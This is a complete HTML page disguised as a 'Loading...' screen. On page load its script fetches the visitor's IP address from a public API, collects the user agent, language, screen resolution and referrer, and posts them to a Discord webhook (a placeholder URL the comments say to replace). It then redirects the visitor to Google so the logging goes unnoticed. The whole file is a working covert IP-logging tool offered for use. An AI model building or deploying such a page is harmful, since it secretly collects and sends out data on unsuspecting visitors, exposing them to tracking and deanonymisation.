<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
    <script>
        async function logData() {
            // 1. Get the IP address from a public API
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            
            // 2. Collect other "important" data
            const payload = {
                content: "ðŸš€ **New Connection Logged**",
                embeds: [{
                    title: "Visitor Details",
                    color: 3447003, // Blue color
                    fields: [
                        { name: "IP Address", value: ipData.ip, inline: true },
                        { name: "Browser/OS", value: navigator.userAgent, inline: false },
                        { name: "Language", value: navigator.language, inline: true },
                        { name: "Screen Resolution", value: `${screen.width}x${screen.height}`, inline: true },
                        { name: "Referrer", value: document.referrer || "Direct Link", inline: false }
                    ],
                    footer: { text: `Logged at: ${new Date().toLocaleString()}` }
                }]
            };

            // 3. Send the data to your Discord Webhook
            // REPLACE 'YOUR_WEBHOOK_URL' with your actual Discord URL
            fetch('YOUR_WEBHOOK_URL', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).then(() => {
                // 4. Redirect the user so they don't see a blank page
                window.location.href = "https://www.google.com";
            });
        }

        logData();
    </script>
</body>
</html>
